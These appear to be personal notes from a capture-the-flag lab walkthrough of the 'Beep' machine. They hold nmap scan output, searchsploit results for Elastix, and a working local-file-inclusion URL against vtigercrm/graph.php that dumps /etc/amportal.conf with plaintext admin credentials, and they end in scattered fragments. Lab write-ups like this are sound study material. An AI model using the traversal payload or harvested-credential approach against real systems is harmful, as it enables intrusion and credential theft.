```
Not shown: 988 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 adee5abb6937fb27afb83072a0f96f53 (DSA)
|_  2048 bcc6735913a18a4b550750f6651d6d0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: TOP RESP-CODES PIPELINING STLS USER LOGIN-DELAY(0) IMPLEMENTATION(Cyrus POP3 server v2) AUTH-RESP-CODE UIDL EXPIRE(NEVER) APOP
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            875/udp   status
|_  100024  1            878/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: BINARY Completed UIDPLUS OK NAMESPACE THREAD=REFERENCES X-NETSCAPE SORT=MODSEQ URLAUTHA0001 MAILBOX-REFERRALS CATENATE CONDSTORE ACL ID RIGHTS=kxte LISTEXT RENAME CHILDREN NO UNSELECT ATOMIC QUOTA STARTTLS ANNOTATEMORE IMAP4 THREAD=ORDEREDSUBJECT SORT MULTIAPPEND IMAP4rev1 LITERAL+ LIST-SUBSCRIBED IDLE
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.2.3 (CentOS)
|_ssl-date: 2023-07-17T20:10:58+00:00; +14s from scanner time.
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_http-title: Elastix - Login page
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com

Host script results:
|_clock-skew: 13s

```

![[Pasted image 20230717222650.png]]

The website 443 is running on TLS1.0 which is by itself vulnerable but the server is Elastix and with using exploitdb `searchsploit elastix` I have found possible exploits:

```
Elastix - 'page' Cross-Site Scripting                                                                                                                        | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                                                                      | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                                                                             | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                                                                                                                            | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                                                                                                                           | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                                       | php/webapps/18650.py

```

**Elastix 2.2.0 - 'graph.php' Local File Inclusion**

Directory traversal for access DB info:
```
https://10.10.10.7/vtigercrm/graph.php?current_language=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fetc%2Famportal.conf%00&module=Accounts&action=
```


```
AMPDBHOST: Hostname where the FreePBX database resides                           
AMPDBENGINE: Engine hosting the FreePBX database (e.g. mysql)                    AMPDBNAME: Name of the FreePBX database (e.g. asterisk)                          AMPDBUSER: Username used to connect to the FreePBX database                      AMPDBPASS: Password for AMPDBUSER (above)                                        AMPENGINE: Telephony backend engine (e.g. asterisk)                              AMPMGRUSER: Username to access the Asterisk Manager Interface                    AMPMGRPASS: Password for AMPMGRUSER                                              AMPDBHOST=localhost AMPDBENGINE=mysql                                            AMPDBNAME=asterisk AMPDBUSER=asteriskuser                                        AMPDBPASS=amp109 AMPDBPASS=jEhdIekWmdjE AMPENGINE=asterisk AMPMGRUSER=admin      AMPMGRPASS=amp111 AMPMGRPASS=jEhdIekWmdjE                                        AMPBIN: Location of the FreePBX command line scripts                             AMPSBIN: Location of (root) command line scripts                                 AMPBIN=/var/lib/asterisk/bin AMPSBIN=/usr/local/sbin                             AMPWEBROOT: Path to Apache's webroot (leave off trailing slash)                  AMPCGIBIN: Path to Apache's cgi-bin dir (leave off trailing slash)               AMPWEBADDRESS: The IP address or host name used to access the AMP web admin      AMPWEBROOT=/var/www/html AMPCGIBIN=/var/www/cgi-bin                              AMPWEBADDRESS=x.x.x.x|hostname                                                   
```

admin
jEhdIekWmdjE

Weak keys:
Fanis Papafanopoulos
Kernel:
|Linux(i386)|2.6.18|238.12.1.el5|